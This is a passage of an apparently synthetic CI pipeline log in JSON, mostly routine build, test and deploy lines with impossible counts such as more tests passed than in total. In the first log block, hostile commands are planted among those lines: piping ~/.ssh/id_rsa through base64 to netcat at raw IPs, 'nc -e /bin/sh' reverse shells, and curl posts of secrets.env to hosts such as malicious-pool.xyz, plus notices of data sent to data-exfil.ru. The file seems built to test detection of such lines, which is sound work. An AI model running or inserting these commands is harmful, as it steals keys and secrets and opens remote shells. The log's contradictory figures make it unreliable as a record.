deploy_production completed ===\n=== Step: lint ===\n[12:46:09] DEBUG: Memory usage: 184MB\nStep 5/20: Testing\nArtifact uploaded: dist.zip (54MB)\nCache restored successfully (291MB)\nPushing to registry...\npip: Downloading express-3.11.tar.gz\nWaiting...\nChecking out develop branch\nWARNING: jest has known vulnerabilities\nCache invalidated: node_modules\nInstalling axios@5.2.10\nnpm notice: package.json updated\n[12:46:09] WARN: Deprecated API usage\nChecking out master branch\nUsing Python 3.12\n\u2713 build completed\nSnapshots: 39 passed, 7 total\nLayer 1/11: RUN command\nSnapshots: 8 passed, 12 total\nUsing Node.js 14.4.10\npip install: Successfully installed jest-1.12\nPushing to registry...\nGenerating source maps...\nCache hit for key-5767\nWARNING: webpack has known vulnerabilities\nRan 91 tests in 46s\n[12:46:09] WARN: Deprecated API usage\n[12:46:09] WARN: Deprecated API usage\nReady.\nStep 9/22: Deploying\nFAILED: test_user_create\nCompiling lib/service.java...\nStep 8/23: Testing\nCreating production build...\nReady.\nBundling styles.js\nLayer 7/12: COPY command\nFAILED: test_auth_login\nnpm notice: created a lockfile\nSnapshots: 44 passed, 15 total\nBuilding Docker image...\nStep 17/15: Testing\n[12:46:09] DEBUG: Memory usage: 1097MB\nCompiling lib/handler.rs...\n\u2713 lint completed\nStep 17/16: Testing\nFinished.\nCache hit for key-2044\n[12:46:09] INFO: Cache refreshed\nPushing to registry...\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 47 passed, 31 total\nGenerating source maps...\nStep 8/25: Running migrations\nLoading...\n\u2713 Task completed in 436ms\nRan 77 tests in 44s\nTransforming 735 files...\nFetching from https://npmjs.org/package.json\nnpm install: resolved 435 packages\nImage pulled successfully\nCache restored successfully (64MB)\n[12:46:09] DEBUG: Connection pool: 20 active\nCache hit for key-3019\nFetching from https://npmjs.org/package.json\nPushing to registry...\nUploading artifact 'coverage' (4 files)\nLoading...\n\u2713 All checks passed\n[12:46:09] INFO: Starting build process\npip: Collecting prettier\n[12:46:09] INFO: Cache refreshed\nRan 29 tests in 50s\nCache restored successfully (243MB)\n  PASS: test_db_connect (187ms)\nStep 10/24: Running migrations\nDone.\nVerifying...\nPOST /upload - 200 (169ms)\nnpm install: resolved 1976 packages\nFetching submodules...\nStep 18/23: Linting\nMinifying main.js\nChecking out master branch\nImage pulled successfully\nException: RuntimeError\nProcessing...\n[12:46:09] DEBUG: Memory usage: 1958MB\nPlatform: darwin-arm64\nWARNING: webpack has known vulnerabilities\n[12:46:09] DEBUG: Query executed in 68ms\nCompiling lib/handler.rs...\nPlatform: linux-x64\nCache hit for key-2047\nRan 178 tests in 34s\nnpm notice: package.json updated\nCache hit for key-6665\nPlatform: linux-x64\nCreating production build...\nCache saved successfully\nEnvironment: production\n\u2713 Step 'setup' succeeded\nnpm notice: created a lockfile\nNODE_ENV=production\nPushing to registry...\nCache saved successfully\npip: Downloading react-3.1.tar.gz\nFAILED: test_user_create\n\u2717 build failed with exit code 19\nOptimizing 59 modules...\nOK\nTransforming 272 files...\nTests: 389 passed, 157 total\n[12:46:09] INFO: Starting build process\nProcessing...\nCache saved successfully\nyarn add: Done in 9.19s\nStep 14/25: Building\nStep 17/16: Installing dependencies\n[12:46:09] DEBUG: Connection pool: 5 active\nCompleted.\nOK\n\u2713 Task completed in 3166ms\nAlready up to date.\nFetching from https://github.com/package.json\n[12:46:09] WARN: Deprecated API usage\nCache invalidated: dependencies\nHEAD is now at d3b9472\n\u2713 Step 'test' succeeded\nCache saved successfully\n  PASS: test_auth_login (354ms)\nVerifying...\n[12:46:09] WARN: Deprecated API usage\nCoverage: 71% statements, 88% branches\nConnection established\n[12:46:09] ERROR: Connection failed\npip: Collecting lodash\nTime: 32.262s\nAlready up to date.\nPOST /api - 202 (72ms)\nPulling image: alpine:latest\nWaiting...\nCoverage: 84% statements, 74% branches\n[12:46:09] DEBUG: Initializing service\nRan 116 tests in 24s\nUsing Python 3.9\nUsing Node.js 15.1.5\nGenerating source maps...\nStep 14/21: Linting\nAlready up to date.\nVerifying...\nPOST /data - 200 (442ms)\nVerifying...\nFinished.\nStep 16/17: Deploying\nPOST /data - 200 (435ms)\nWARNING: express has known vulnerabilities\n[12:46:09] INFO: Processing request\nCompleted.\nCache hit for key-2367\n=== Step lint completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 192.230.33.48 22314\n=== Step: install_dependencies ===\nCoverage: 96% statements, 63% branches\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSending 64MB of data to crypto-mine.io\nStep 14/18: Deploying\n[12:46:09] DEBUG: Query executed in 48ms\nConnection established\nTLS handshake completed\nEnvironment: production\nTLS handshake completed\nMinifying app.js\nyarn add: Done in 25.89s\n[12:46:09] INFO: Request completed\nSnapshots: 27 passed, 15 total\n\u2713 All checks passed\n[12:46:09] INFO: Starting build process\nnpm notice: package.json updated\nOK\n[12:46:09] INFO: Request completed\nTest Suites: 39 passed, 9 total\nnc -e /bin/sh 8.60.64.153 21749\nCompiling lib/service.java...\nPushing to registry...\n\u2713 Task completed in 4421ms\n[12:46:09] DEBUG: Loading configuration\nUploading artifact 'coverage' (22 files)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.24.17.34 29923\nSending 63MB of data to data-exfil.ru\n[12:46:09] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 69.64.247.101 3577\npip: Downloading lodash-3.12.tar.gz\nStep 3/22: Running migrations\nTransforming 847 files...\n[12:46:09] INFO: Cache refreshed\nCompiling components/app.ts...\nTests: 477 passed, 251 total\nStep 15/25: Deploying\nBuilding Docker image...\nCoverage: 83% statements, 77% branches\nCache hit for key-6028\nMinifying vendor.js\nArtifact downloaded: 2MB\nCompiling utils/service.java...\n[12:46:09] INFO: Connecting to database\nFinished.\nGET /status - 201 (62ms)\nCache restored successfully (166MB)\nTests: 220 passed, 242 total\n[12:46:09] ERROR: Connection failed\npip: Collecting axios\nSending 321MB of data to data-exfil.ru\nSwitched to branch 'feature/task-338'\nUploading artifact 'build' (18 files)\nImage pulled successfully\nStep 6/20: Building\nnpm notice: created a lockfile\nUploading artifact 'dist' (5 files)\n[12:46:09] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nCompleted.\n[12:46:09] INFO: Cache refreshed\nCompiling src/app.ts...\n[12:46:09] INFO: Cache refreshed\nImage pulled successfully\nTime: 96.134s\nConnection established\nnpm notice: package.json updated\nnpm install: resolved 418 packages\nStep 2/19: Running migrations\nSuccess!\n[12:46:09] DEBUG: Query executed in 68ms\nCache restored successfully (417MB)\nPOST /upload - 200 (281ms)\nFinished.\nCache invalidated: dependencies\nSwitched to branch 'hotfix/task-861'\nWARNING: express has known vulnerabilities\nSwitched to branch 'feature/task-473'\necho $(cat ~/.ssh/id_rsa) | base64 | nc 177.170.66.127 34695\nArtifact uploaded: build.tar.gz (43MB)\n[12:46:09] DEBUG: Loading configuration\nCache invalidated: build\nCache miss for key-2111\nLayer 5/15: RUN command\nPOST /data - 201 (313ms)\n  PASS: test_db_connect (131ms)\n[12:46:09] INFO: Connecting to database\npip: Installing build dependencies...\nConnection established\nCache miss for key-5709\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nSwitched to branch 'hotfix/task-166'\npip install: Successfully installed react-3.1\nSwitched to branch 'bugfix/task-487'\nWARNING: prettier has known vulnerabilities\nRan 171 tests in 31s\nPlatform: linux-x64\nProcessing...\nProcessing...\nArtifact uploaded: dist.zip (23MB)\nStep 2/17: Linting\n[12:46:09] WARN: Deprecated API usage\nRan 179 tests in 29s\n[12:46:09] INFO: Processing request\nLayer 3/10: ENV command\n[12:46:09] DEBUG: Loading configuration\nImage pulled successfully\nTime: 92.698s\nTest Suites: 14 passed, 15 total\n\u2713 All checks passed\nFetching from https://docker.io/package.json\necho $(cat ~/.ssh/id_rsa) | base64 | nc 38.100.154.63 23955\nSending 426MB of data to data-exfil.ru\nnc -e /bin/sh 77.95.82.28 53022\npip: Downloading webpack-5.20.tar.gz\n[12:46:09] DEBUG: Memory usage: 304MB\n[12:46:09] INFO: Starting build process\nException: RuntimeError\nStep 1/23: Building\n\u2717 build failed with exit code 105\nSnapshots: 50 passed, 42 total\nLoading...\nArtifact uploaded: build.tar.gz (32MB)\nHEAD is now at a62195d\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 44.61.213.46 48138\nCache miss for key-9687\nOK\nReady.\nDone.\nMinifying app.js\nEnvironment: test\nMinifying vendor.js\npip: Installing build dependencies...\nNODE_ENV=production\nTLS handshake completed\nnpm install: resolved 796 packages\nHEAD is now at 7c26164\n[12:46:09] DEBUG: Connection pool: 6 active\nStep 6/21: Installing dependencies\n[12:46:09] DEBUG: Memory usage: 1901MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\nCoverage: 94% statements, 69% branches\nProcessing...\nCache hit for key-8550\nLoading...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (17MB)\nTests: 400 passed, 305 total\nWARNING: axios has known vulnerabilities\nnpm install: added 25 packages\nUsing Python 3.10\nPlatform: linux-x64\nStep 20/25: Running migrations\n[12:46:09] INFO: Request completed\nnpm notice: created a lockfile\nCache saved successfully\npip: Downloading axios-5.11.tar.gz\nPOST /upload - 200 (119ms)\n[12:46:09] DEBUG: Initializing service\n[12:46:09] INFO: Connecting to database\nConnection established\nSwitched to branch 'bugfix/task-321'\nnpm install: resolved 653 packages\nnc -e /bin/sh 2.122.22.61 54903\n[12:46:09] INFO: Connecting to database\n\u2713 Step 'test' succeeded\nStep 18/18: Deploying\n\u2713 validate completed\nCreating production build...\nReady.\nStep 1/20: Building\nSwitched to branch 'feature/task-677'\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-20T12:46:09.709775",
        "finished_at": "2025-12-20T12:46:21.148361",
        "log_lines": [
          "=== Step: type_check ===",
          "Using Python 3.11",
          "Ran 53 tests in 30s",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "[12:46:09] INFO: Starting build process",
          "Time: 79.131s",
          "Artifact downloaded: 1MB",
          "npm notice: created a lockfile",
          "Ran 81 tests in 46s",
          "[12:46:09] INFO: Request completed",
          "Compiling components/index.js...",
          "Cache miss for key-9878",
          "Generating source maps...",
          "Generating source maps...",
          "Bundling main.js",
          "[12:46:09] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Pushing to registry...",
          "Checking out develop branch",
          "  PASS: test_auth_login (232ms)",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "pip: Collecting express",
          "Loading...",
          "TLS handshake completed",
          "npm install: resolved 354 packages",
          "Tests: 55 passed, 258 total",
          "Step 19/25: Installing dependencies",
          "\u2717 build failed with exit code 40",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "Ran 168 tests in 4s",
          "[12:46:09] DEBUG: Query executed in 6ms",
          "Installing express@1.4.2",
          "Test Suites: 33 passed, 38 total",
          "WARNING: webpack has known vulnerabilities",
          "Checking out master branch",
          "Optimizing 51 modules...",
          "Generating source maps...",
          "Compiling src/handler.rs...",
          "Success!",
          "Step 13/18: Testing",
          "Uploading artifact 'dist' (22 files)",
          "Cache saved successfully",
          "Cache miss for key-5679",
          "Success!",
          "Step 11/23: Deploying",
          "[12:46:09] INFO: Request completed",
          "Installing webpack@1.19.10",
          "Step 19/17: Testing",
          "[12:46:09] INFO: Cache refreshed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact downloaded: 49MB",
          "Creating production build...",
          "Test Suites: 37 passed, 33 total",
          "[12:46:09] DEBUG: Loading configuration",
          "[12:46:09] INFO: Processing request",
          "Installing jest@4.13.5",
          "  PASS: unit/test_user_create.spec.js",
          "POST /api - 202 (91ms)",
          "[12:46:09] WARN: Deprecated API usage",
          "Step 11/21: Running migrations",
          "Bundling styles.css",
          "\u2713 All checks passed",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 1165 packages",
          "TLS handshake completed",
          "[12:46:09] DEBUG: Initializing service",
          "Cache hit for key-6145",
          "Cache restored successfully (359MB)",
          "Compiling components/index.js...",
          "npm install: added 343 packages",
          "Verifying...",
          "Compiling src/app.ts...",
          "Finished.",
          "Step 3/20: Building",
          "Fetching submodules...",
          "Bundling main.css",
          "Checking out main branch",
          "[12:46:09] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 28.30s",
          "pip install: Successfully installed jest-4.6",
          "Using Python 3.11",
          "POST /upload - 200 (92ms)",
          "Success!",
          "[12:46:09] WARN: Deprecated API usage",
          "pip: Collecting jest",
          "  PASS: test_auth_login (494ms)",
          "Fetching from https://googleapis.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 43 passed, 41 total",
          "Cache restored successfully (123MB)",
          "pip: Downloading axios-5.11.tar.gz",
          "pip: Installing build dependencies...",
          "pip: Collecting jest",
          "Ran 26 tests in 8s",
          "Compiling components/main.py...",
          "Bundling vendor.css",
          "Platform: darwin-arm64",
          "GET /api - 200 (18ms)",
          "[12:46:09] WARN: Deprecated API usage",
          "Step 2/21: Installing dependencies",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Bundling vendor.js",
          "[12:46:09] INFO: Request completed",
          "Using Python 3.10",
          "Creating production build...",
          "Transforming 216 files...",
          "[12:46:09] DEBUG: Query executed in 62ms",
          "Step 17/23: Linting",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 1377ms",
          "[12:46:09] INFO: Request completed",
          "Loading...",
          "Cache invalidated: node_modules",
          "Step 3/22: Building",
          "Bundling runtime.js",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed axios-2.2",
          "Step 4/25: Linting",
          "[12:46:09] DEBUG: Query executed in 64ms",
          "pip install: Successfully installed react-5.0",
          "OK",
          "Step 6/22: Running migrations",
          "Step 12/22: Installing dependencies",
          "pip: Collecting react",
          "Ready.",
          "POST /upload - 202 (81ms)",
          "Already up to date.",
          "Finished.",
          "\u2713 Task completed in 3596ms",
          "Using Python 3.10",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed eslint-4.10",
          "[12:46:09] DEBUG: Connection pool: 19 active",
          "Time: 96.141s",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Cache miss for key-2018",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@1.8.7",
          "npm install: resolved 410 packages",
          "  PASS: e2e/test_api_health.spec.js",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Creating production build...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Processing...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 Task completed in 892ms",
          "Already up to date.",
          "Completed.",
          "Building Docker image...",
          "Artifact downloaded: 45MB",
          "[12:46:09] DEBUG: Query executed in 68ms",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-20T12:46:21.148361",
        "finished_at": "2025-12-20T12:46:25.723796",
        "log_lines": [
          "=== Step: checkout ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: react has known vulnerabilities",
          "Building Docker image...",
          "Success!",
          "  PASS: test_user_create (146ms)",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling vendor.js",
          "POST /api - 202 (401ms)",
          "WARNING: axios has known vulnerabilities",
          "Fetching from https://docker.io/package.json",
          "Artifact downloaded: 5MB",
          "Step 19/21: Installing dependencies",
          "Cache invalidated: build",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Coverage: 75% statements, 73% branches",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Installing react@1.7.5",
          "Creating production build...",
          "Cache restored successfully (360MB)",
          "[12:46:09] DEBUG: Memory usage: 1207MB",
          "[12:46:09] INFO: Request completed",
          "NODE_ENV=production",
          "Optimizing 55 modules...",
          "Generating source maps...",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-225'",
          "\u2713 Task completed in 1889ms",
          "npm install: resolved 1898 packages",
          "Pulling image: node:3.11",
          "Finished.",
          "Cache saved successfully",
          "[12:46:09] DEBUG: Initializing service",
          "Fetching from https://googleapis.com/package.json",
          "\u2713 Step 'build' succeeded",
          "[12:46:09] INFO: Starting build process",
          "Already up to date.",
          "npm notice: created a lockfile",
          "npm install: added 488 packages",
          "[12:46:09] INFO: Connecting to database",
          "TLS handshake completed",
          "Fetching submodules...",
          "Compiling lib/utils.go...",
          "Cache saved successfully",
          "Layer 7/9: ENV command",
          "Cache invalidated: node_modules",
          "Compiling components/service.java...",
          "[12:46:09] WARN: Deprecated API usage",
          "Step 20/17: Running migrations",
          "npm notice: created a lockfile",
          "Success!",
          "Pulling image: alpine:18",
          "Step 11/23: Deploying",
          "[12:46:09] INFO: Processing request",
          "Exception: ValueError",
          "[12:46:09] INFO: Connecting to database",
          "Using Python 3.10",
          "WARNING: react has known vulnerabilities",
          "\u2713 Task completed in 931ms",
          "npm notice: package.json updated",
          "Tests: 150 passed, 252 total",
          "Building Docker image...",
          "Connection established",
          "[12:46:09] DEBUG: Memory usage: 619MB",
          "Waiting...",
          "Pushing to registry...",
          "[12:46:09] DEBUG: Query executed in 22ms",
          "npm install: added 159 packages",
          "Connection established",
          "WARNING: jest has known vulnerabilities",
          "[12:46:09] INFO: Processing request",
          "Connection established",
          "Using Python 3.12",
          "Time: 113.457s",
          "Minifying main.js",
          "Cache invalidated: build",
          "[12:46:09] INFO: Cache refreshed",
          "Already up to date.",
          "Checking out develop branch",
          "Checking out develop branch",
          "Cache saved successfully",
          "Pushing to registry...",
          "Success!",
          "Waiting...",
          "[12:46:09] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "GET /health - 204 (79ms)",
          "Connection established",
          "[12:46:09] INFO: Starting build process",
          "Test Suites: 50 passed, 12 total",
          "Step 12/16: Building",
          "Transforming 271 files...",
          "npm notice: package.json updated",
          "Waiting...",
          "Connection established",
          "HEAD is now at 80451df",
          "Environment: production",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:09] DEBUG: Connection pool: 16 active",
          "Step 3/23: Building",
          "Tests: 203 passed, 343 total",
          "pip: Installing build dependencies...",
          "Cache miss for key-2448",
          "Waiting...",
          "Ready.",
          "[12:46:09] INFO: Request completed",
          "Cache hit for key-1009",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "[12:46:09] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "pip: Collecting react",
          "\u2713 All checks passed",
          "[12:46:09] DEBUG: Query executed in 30ms",
          "[12:46:09] WARN: Deprecated API usage",
          "Image pulled successfully",
          "[12:46:09] INFO: Request completed",
          "Compiling src/service.java...",
          "Step 19/25: Linting",
          "OK",
          "npm install: added 446 packages",
          "Checking out develop branch",
          "Cache saved successfully",
          "Installing lodash@5.19.0",
          "pip install: Successfully installed react-2.5",
          "Installing eslint@5.16.1",
          "Step 19/20: Installing dependencies",
          "Already up to date.",
          "[12:46:09] DEBUG: Connection pool: 13 active",
          "[12:46:09] WARN: Deprecated API usage",
          "Layer 8/15: COPY command",
          "Step 10/19: Testing",
          "pip: Installing build dependencies...",
          "Transforming 613 files...",
          "WARNING: react has known vulnerabilities",
          "[12:46:09] INFO: Cache refreshed",
          "Using Node.js 18.8.3",
          "Layer 8/10: COPY command",
          "  PASS: test_api_health (344ms)",
          "Uploading artifact 'dist' (6 files)",
          "Verifying...",
          "Exception: NullPointerException",
          "Step 10/15: Deploying",
          "Pulling image: node:18",
          "Coverage: 71% statements, 85% branches",
          "Step 12/25: Testing",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "Step 2/23: Running migrations",
          "[12:46:09] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (95MB)",
          "Fetching from https://registry.npmjs.org/package.json",
          "Done.",
          "[12:46:09] DEBUG: Memory usage: 267MB",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-20T12:46:25.723796",
        "finished_at": "2025-12-20T12:46:37.162382",
        "log_lines": [
          "=== Step: setup_environment ===",
          "GET /status - 204 (31ms)",
          "[12:46:09] INFO: Cache refreshed",
          "Snapshots: 26 passed, 5 total",
          "Step 11/22: Building",
          "Done.",
          "Cache hit for key-3602",
          "Step 19/19: Running migrations",
          "  PASS: test_db_connect (271ms)",
          "\u2713 Task completed in 4152ms",
          "Building Docker image...",
          "Image pulled successfully",
          "yarn add: Done in 10.44s",
          "npm notice: package.json updated",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 28 passed, 18 total",
          "Pulling image: node:3.11",
          "Compiling components/handler.rs...",
          "Transforming 236 files...",
          "Artifact downloaded: 26MB",
          "Transforming 490 files...",
          "TLS handshake completed",
          "[12:46:09] WARN: Deprecated API usage",
          "\u2713 deploy completed",
          "Fetching submodules...",
          "Tests: 115 passed, 256 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (33MB)",
          "Coverage: 94% statements, 97% branches",
          "pip: Downloading lodash-3.17.tar.gz",
          "Environment: production",
          "[12:46:09] INFO: Processing request",
          "npm notice: created a lockfile",
          "[12:46:09] DEBUG: Connection pool: 1 active",
          "[12:46:09] INFO: Processing request",
          "Artifact uploaded: dist.zip (96MB)",
          "HEAD is now at a3c243d",
          "Switched to branch 'feature/task-948'",
          "POST /data - 201 (441ms)",
          "Installing eslint@2.3.9",
          "Completed.",
          "Step 10/23: Building",
          "pip: Downloading prettier-4.16.tar.gz",
          "Cache restored successfully (131MB)",
          "pip: Downloading express-2.17.tar.gz",
          "[12:46:09] WARN: Deprecated API usage",
          "[12:46:09] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Done.",
          "Transforming 854 files...",
          "[12:46:09] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-934'",
          "[12:46:09] INFO: Starting build process",
          "[12:46:09] INFO: Request completed",
          "POST /data - 200 (68ms)",
          "Fetching from https://npmjs.org/package.json",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Image pulled successfully",
          "Tests: 118 passed, 241 total",
          "Minifying main.js",
          "Step 2/15: Linting",
          "Compiling lib/index.js...",
          "\u2713 All checks passed",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: dist.zip (96MB)",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "pip install: Successfully installed express-5.16",
          "Cache invalidated: dependencies",
          "[12:46:09] WARN: Deprecated API usage",
          "Pulling image: node:3.11",
          "Pushing to registry...",
          "[12:46:09] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "HEAD is now at 2088780",
          "Compiling src/index.js...",
          "Finished.",
          "Bundling runtime.js",
          "Time: 16.64s",
          "Bundling runtime.css",
          "WARNING: jest has known vulnerabilities",
          "\u2713 All checks passed",
          "Switched to branch 'bugfix/task-356'",
          "Tests: 266 passed, 76 total",
          "Step 17/22: Running migrations",
          "npm notice: created a lockfile",
          "npm install: added 118 packages",
          "FAILED: test_user_create",
          "Building Docker image...",
          "[12:46:09] DEBUG: Initializing service",
          "POST /data - 202 (250ms)",
          "[12:46:09] INFO: Processing request",
          "Exception: ValueError",
          "Connection established",
          "Artifact downloaded: 26MB",
          "\u2713 validate completed",
          "TLS handshake completed",
          "Pushing to registry...",
          "[12:46:09] DEBUG: Loading configuration",
          "Environment: development",
          "[12:46:09] DEBUG: Loading configuration",
          "POST /upload - 200 (335ms)",
          "Verifying...",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Snapshots: 23 passed, 44 total",
          "Waiting...",
          "Step 19/19: Building",
          "pip install: Successfully installed react-2.8",
          "Fetching submodules...",
          "Pulling image: alpine:18",
          "Uploading artifact 'dist' (43 files)",
          "Using Python 3.10",
          "Pushing to registry...",
          "\u2713 deploy completed",
          "\u2713 build completed",
          "Cache saved successfully",
          "Environment: development",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "Step 5/24: Running migrations",
          "Using Python 3.12",
          "Checking out develop branch",
          "Cache invalidated: dependencies",
          "[12:46:09] INFO: Starting build process",
          "Success!",
          "pip install: Successfully installed axios-3.9",
          "Done.",
          "HEAD is now at 523167b",
          "Checking out develop branch",
          "[12:46:09] DEBUG: Memory usage: 226MB",
          "Environment: production",
          "Switched to branch 'feature/task-464'",
          "[12:46:09] INFO: Cache refreshed",
          "Snapshots: 47 passed, 46 total",
          "Pushing to registry...",
          "Success!",
          "Transforming 993 files...",
          "pip: Downloading jest-3.8.tar.gz",
          "Switched to branch 'hotfix/task-789'",
          "Artifact uploaded: build.tar.gz (48MB)",
          "npm notice: created a lockfile",
          "Verifying...",
          "\u2713 validate completed",
          "Using Node.js 18.5.8",
          "[12:46:09] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "[12:46:09] DEBUG: Loading configuration",
          "Success!",
          "Cache invalidated: dependencies",
          "Processing...",
          "Verifying...",
          "Coverage: 92% statements, 98% branches",
          "pip: Installing build dependencies...",
          "Loading...",
          "Optimizing 53 modules...",
          "Coverage: 100% statements, 81% branches",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-20T12:46:37.162382",
        "finished_at": "2025-12-20T12:46:44.025534",
        "log_lines": [
          "=== Step: save_cache ===",
          "Using Node.js 19.0.0",
          "POST /data - 202 (229ms)",
          "npm install: resolved 283 packages",
          "Using Python 3.10",
          "Creating production build...",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 13 passed, 11 total",
          "npm install: added 104 packages",
          "TLS handshake completed",
          "Fetching submodules...",
          "[12:46:09] DEBUG: Connection pool: 4 active",
          "Time: 17.454s",
          "Bundling runtime.js",
          "[12:46:09] DEBUG: Loading configuration",
          "Loading...",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Ready.",
          "Compiling utils/handler.rs...",
          "Layer 2/10: ENV command",
          "Done.",
          "\u2713 Step 'setup' succeeded",
          "Connection established",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Image pulled successfully",
          "yarn add: Done in 28.40s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "npm install: added 441 packages",
          "Done.",
          "\u2717 build failed with exit code 12",
          "NODE_ENV=production",
          "Platform: darwin-arm64",
          "Time: 23.539s",
          "Creating production build...",
          "Pushing to registry...",
          "npm install: resolved 1390 packages",
          "Done.",
          "Cache restored successfully (119MB)",
          "Cache invalidated: node_modules",
          "Completed.",
          "[12:46:09] INFO: Connecting to database",
          "NODE_ENV=development",
          "Tests: 98 passed, 399 total",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Platform: linux-x64",
          "npm install: added 297 packages",
          "[12:46:09] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 6",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-631'",
          "Processing...",
          "Creating production build...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Artifact uploaded: dist.zip (32MB)",
          "\u2713 Task completed in 1146ms",
          "Pulling image: alpine:latest",
          "[12:46:09] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (95MB)",
          "Switched to branch 'hotfix/task-184'",
          "Minifying app.js",
          "[12:46:09] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Snapshots: 10 passed, 15 total",
          "Artifact downloaded: 8MB",
          "Optimizing 43 modules...",
          "Waiting...",
          "Compiling src/main.py...",
          "Fetching from https://gcr.io/package.json",
          "Bundling vendor.css",
          "TLS handshake completed",
          "[12:46:09] INFO: Starting build process",
          "Tests: 452 passed, 354 total",
          "npm install: resolved 1328 packages",
          "Coverage: 83% statements, 63% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Step 2/21: Running migrations",
          "NODE_ENV=development",
          "\u2713 Step 'test' succeeded",
          "[12:46:09] DEBUG: Loading configuration",
          "Connection established",
          "Image pulled successfully",
          "Waiting...",
          "pip: Collecting lodash",
          "\u2713 Step 'checkout' succeeded",
          "Processing...",
          "Compiling lib/app.ts...",
          "Step 12/21: Installing dependencies",
          "Done.",
          "Bundling main.js",
          "Processing...",
          "Already up to date.",
          "Pulling image: node:18",
          "Completed.",
          "  PASS: test_auth_login (157ms)",
          "Layer 4/11: COPY command",
          "Bundling vendor.css",
          "Completed.",
          "Transforming 495 files...",
          "Already up to date.",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Time: 58.98s",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Processing...",
          "[12:46:09] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Platform: darwin-arm64",
          "Waiting...",
          "npm install: added 457 packages",
          "Step 13/23: Running migrations",
